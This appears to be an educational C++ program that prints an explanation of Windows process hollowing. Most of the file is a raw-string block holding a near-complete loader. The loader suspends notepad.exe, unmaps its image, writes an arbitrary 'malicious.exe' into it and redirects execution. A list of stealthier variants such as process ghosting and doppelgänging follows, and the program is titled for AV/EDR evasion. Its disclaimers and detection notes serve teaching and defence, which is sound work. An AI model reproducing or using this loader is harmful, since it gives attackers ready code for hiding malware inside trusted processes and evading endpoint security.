/**
 * process_hollowing.cpp
 * 
 * This module demonstrates process hollowing, a technique used to
 * execute malicious code within the context of a legitimate process.
 * 
 * EDUCATIONAL PURPOSE ONLY: This code is for learning about security concepts.
 * Using these techniques against systems without authorization is illegal.
 */

#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <string>

// We need to define some structures and functions that are not in the standard headers
typedef LONG NTSTATUS;
typedef LONG KPRIORITY;

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

// Process basic information structure
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

// Function pointer types for NtUnmapViewOfSection and NtQueryInformationProcess
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(HANDLE ProcessHandle, DWORD ProcessInformationClass, 
                                                     PVOID ProcessInformation, ULONG ProcessInformationLength, 
                                                     PULONG ReturnLength);

/**
 * @brief Explains the process hollowing technique
 */
void explainProcessHollowing() {
    std::cout << "=== Process Hollowing Overview ===" << std::endl;
    
    std::cout << "Process hollowing is a technique that creates a legitimate process in a suspended state," << std::endl;
    std::cout << "unmaps its memory, and replaces it with malicious code." << std::endl;
    std::cout << std::endl;
    
    std::cout << "The basic steps are:" << std::endl;
    std::cout << "1. Create a new process in a suspended state" << std::endl;
    std::cout << "2. Unmap the memory of the suspended process" << std::endl;
    std::cout << "3. Allocate new memory in the process" << std::endl;
    std::cout << "4. Write the malicious executable into the process memory" << std::endl;
    std::cout << "5. Update the process entry point" << std::endl;
    std::cout << "6. Resume the process" << std::endl;
    std::cout << std::endl;
    
    std::cout << "Advantages of process hollowing:" << std::endl;
    std::cout << "- The malicious code runs under the context of a legitimate process" << std::endl;
    std::cout << "- The process name in task manager appears legitimate" << std::endl;
    std::cout << "- Can bypass application whitelisting" << std::endl;
    std::cout << std::endl;
}

/**
 * @brief Demonstrates the process hollowing technique
 */
void demonstrateProcessHollowing() {
    std::cout << "=== Process Hollowing Implementation ===" << std::endl;
    
    std::cout << "Example code (will not execute):" << std::endl;
    std::cout << R"(
    // Path to the legitimate process to hollow
    const char* targetPath = "C:\\Windows\\System32\\notepad.exe";
    
    // Create the process in suspended state
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessA(
        targetPath,               // Application name
        NULL,                     // Command line
        NULL,                     // Process attributes
        NULL,                     // Thread attributes
        FALSE,                    // Inherit handles
        CREATE_SUSPENDED,         // Creation flags
        NULL,                     // Environment
        NULL,                     // Current directory
        &si,                      // Startup info
        &pi                       // Process information
    )) {
        std::cout << "Failed to create process" << std::endl;
        return;
    }
    
    // Get the process's PEB address
    PROCESS_BASIC_INFORMATION pbi;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(
        hNtdll, "NtQueryInformationProcess");
    
    if (!NT_SUCCESS(NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    ))) {
        std::cout << "Failed to query process information" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Read the target process's image base address from its PEB
    DWORD_PTR imageBaseAddress;
    if (!ReadProcessMemory(
        pi.hProcess,
        (PVOID)((DWORD_PTR)pbi.PebBaseAddress + 0x10), // ImageBaseAddress offset in PEB
        &imageBaseAddress,
        sizeof(DWORD_PTR),
        NULL
    )) {
        std::cout << "Failed to read image base address" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Unmap the target process's memory
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(
        hNtdll, "NtUnmapViewOfSection");
    
    if (!NT_SUCCESS(NtUnmapViewOfSection(
        pi.hProcess,
        (PVOID)imageBaseAddress
    ))) {
        std::cout << "Failed to unmap section" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Load the malicious executable into memory
    // In a real scenario, this would be your malicious PE file
    HANDLE hFile = CreateFileA(
        "malicious.exe",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to open malicious executable" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!ReadFile(
        hFile,
        fileBuffer,
        fileSize,
        NULL,
        NULL
    )) {
        std::cout << "Failed to read malicious executable" << std::endl;
        CloseHandle(hFile);
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    CloseHandle(hFile);
    
    // Parse the PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBuffer + dosHeader->e_lfanew);
    
    // Allocate memory in the target process for the malicious executable
    LPVOID remoteBuffer = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)imageBaseAddress,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remoteBuffer) {
        std::cout << "Failed to allocate memory in target process" << std::endl;
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Write the PE headers to the target process
    if (!WriteProcessMemory(
        pi.hProcess,
        remoteBuffer,
        fileBuffer,
        ntHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        std::cout << "Failed to write PE headers" << std::endl;
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Write each section to the target process
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(
            pi.hProcess,
            (LPVOID)((DWORD_PTR)remoteBuffer + sectionHeader[i].VirtualAddress),
            (LPVOID)((DWORD_PTR)fileBuffer + sectionHeader[i].PointerToRawData),
            sectionHeader[i].SizeOfRawData,
            NULL
        )) {
            std::cout << "Failed to write section " << i << std::endl;
            VirtualFree(fileBuffer, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }
    }
    
    // Update the target process's entry point
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &context)) {
        std::cout << "Failed to get thread context" << std::endl;
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Set the new entry point
    #ifdef _WIN64
    context.Rcx = (DWORD_PTR)remoteBuffer + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    #else
    context.Eax = (DWORD_PTR)remoteBuffer + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    #endif
    
    if (!SetThreadContext(pi.hThread, &context)) {
        std::cout << "Failed to set thread context" << std::endl;
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Update the PEB with the new image base address
    if (!WriteProcessMemory(
        pi.hProcess,
        (PVOID)((DWORD_PTR)pbi.PebBaseAddress + 0x10),
        &remoteBuffer,
        sizeof(LPVOID),
        NULL
    )) {
        std::cout << "Failed to update PEB" << std::endl;
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    // Clean up the local buffer
    VirtualFree(fileBuffer, 0, MEM_RELEASE);
    
    // Resume the thread
    if (ResumeThread(pi.hThread) == -1) {
        std::cout << "Failed to resume thread" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }
    
    std::cout << "Process hollowing completed successfully" << std::endl;
    
    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    )" << std::endl;
    
    std::cout << "Detection: Modern EDR solutions detect process hollowing by monitoring:" << std::endl;
    std::cout << "- Process creation with suspended flag" << std::endl;
    std::cout << "- Memory unmapping in a suspended process" << std::endl;
    std::cout << "- Allocation of executable memory in a suspended process" << std::endl;
    std::cout << "- Modification of the PEB" << std::endl;
    std::cout << "- Discrepancies between memory and disk images" << std::endl;
    std::cout << std::endl;
}

/**
 * @brief Discusses variations and improvements to process hollowing
 */
void discussVariations() {
    std::cout << "=== Process Hollowing Variations ===" << std::endl;
    
    std::cout << "Several variations of process hollowing exist to make detection harder:" << std::endl;
    std::cout << std::endl;
    
    std::cout << "1. Module Stomping / Module Overloading:" << std::endl;
    std::cout << "   - Instead of unmapping the entire process, overwrite a specific DLL" << std::endl;
    std::cout << "   - Less suspicious than unmapping the entire image" << std::endl;
    std::cout << std::endl;
    
    std::cout << "2. PE-to-Shellcode Conversion:" << std::endl;
    std::cout << "   - Convert the PE file to position-independent shellcode" << std::endl;
    std::cout << "   - Inject the shellcode instead of mapping a full PE" << std::endl;
    std::cout << std::endl;
    
    std::cout << "3. Process Doppelgänging:" << std::endl;
    std::cout << "   - Uses transacted NTFS operations to create a file mapping" << std::endl;
    std::cout << "   - Writes the malicious PE to the transaction" << std::endl;
    std::cout << "   - Creates a section from the transacted file" << std::endl;
    std::cout << "   - Creates a process using the section" << std::endl;
    std::cout << "   - Rolls back the transaction, leaving no trace on disk" << std::endl;
    std::cout << std::endl;
    
    std::cout << "4. Process Ghosting:" << std::endl;
    std::cout << "   - Creates a file and immediately marks it for deletion" << std::endl;
    std::cout << "   - Writes the malicious PE to the file" << std::endl;
    std::cout << "   - Creates a section from the file" << std::endl;
    std::cout << "   - Creates a process using the section" << std::endl;
    std::cout << "   - The file is deleted when the handle is closed" << std::endl;
    std::cout << std::endl;
}

int main() {
    std::cout << "Process Hollowing Techniques for AV/EDR Evasion" << std::endl;
    std::cout << "===============================================" << std::endl;
    std::cout << std::endl;
    
    explainProcessHollowing();
    demonstrateProcessHollowing();
    discussVariations();
    
    std::cout << "IMPORTANT NOTES:" << std::endl;
    std::cout << "1. These techniques are for educational purposes only" << std::endl;
    std::cout << "2. Modern EDR solutions can detect most process hollowing attempts" << std::endl;
    std::cout << "3. Understanding these techniques helps in building better defenses" << std::endl;
    std::cout << "4. Always obtain proper authorization before testing security controls" << std::endl;
    
    return 0;
}

